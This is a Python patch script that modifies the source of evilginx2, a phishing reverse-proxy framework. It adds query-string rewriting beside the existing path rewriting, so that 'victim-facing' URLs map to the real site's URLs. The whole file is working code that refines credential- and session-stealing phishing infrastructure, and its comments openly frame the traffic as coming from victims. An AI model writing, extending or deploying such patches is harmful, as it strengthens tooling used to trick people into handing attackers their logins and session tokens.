#!/usr/bin/env python3
# patch_wave3.py — #10 v2 query rewrite loader + http_proxy inbound hook. Run in ~/evilginx2-src.
import sys

def patch(path, old, new):
    src = open(path, "r", encoding="utf-8").read()
    n = src.count(old)
    if n != 1:
        sys.exit("[abort] %s: pattern found %dx:\n%s" % (path, n, old[:180]))
    open(path, "w", encoding="utf-8").write(src.replace(old, new))
    print("[patch] %s OK" % path)

# 1) phishlet.go loader: pass query_map + drop into addRewriteUrl
patch("core/phishlet.go",
      "\t\t\tif err := p.addRewriteUrl(*ru.From, *ru.To); err != nil {\n"
      "\t\t\t\treturn err\n"
      "\t\t\t}\n",
      "\t\t\tif err := p.addRewriteUrl(*ru.From, *ru.To, ru.QueryMap, ru.Drop); err != nil {\n"
      "\t\t\t\treturn err\n"
      "\t\t\t}\n")

# 2) http_proxy.go: inbound query rewrite beside the path rewrite
patch("core/http_proxy.go",
      "\t\t\t\t// rewrite_urls: map victim-facing path to real origin path\n"
      "\t\t\t\tif pl != nil {\n"
      "\t\t\t\t\tif np := pl.rewritePathIn(req.URL.Path); np != req.URL.Path {\n"
      '\t\t\t\t\t\tlog.Debug("rewrite_urls: %s -> %s", req.URL.Path, np)\n'
      "\t\t\t\t\t\treq.URL.Path = np\n"
      "\t\t\t\t\t}\n"
      "\t\t\t\t}\n",
      "\t\t\t\t// rewrite_urls: map victim-facing path+query to real origin path+query\n"
      "\t\t\t\tif pl != nil {\n"
      "\t\t\t\t\tru, np := pl.rewritePathInEx(req.URL.Path)\n"
      "\t\t\t\t\tif np != req.URL.Path {\n"
      '\t\t\t\t\t\tlog.Debug("rewrite_urls: %s -> %s", req.URL.Path, np)\n'
      "\t\t\t\t\t\treq.URL.Path = np\n"
      "\t\t\t\t\t}\n"
      "\t\t\t\t\tif ru != nil {\n"
      "\t\t\t\t\t\tif nq := ru.RewriteQueryIn(req.URL.RawQuery); nq != req.URL.RawQuery {\n"
      '\t\t\t\t\t\t\tlog.Debug("rewrite_urls query: %s -> %s", req.URL.RawQuery, nq)\n'
      "\t\t\t\t\t\t\treq.URL.RawQuery = nq\n"
      "\t\t\t\t\t\t}\n"
      "\t\t\t\t\t}\n"
      "\t\t\t\t}\n")

print("[done] wave3 patches applied")
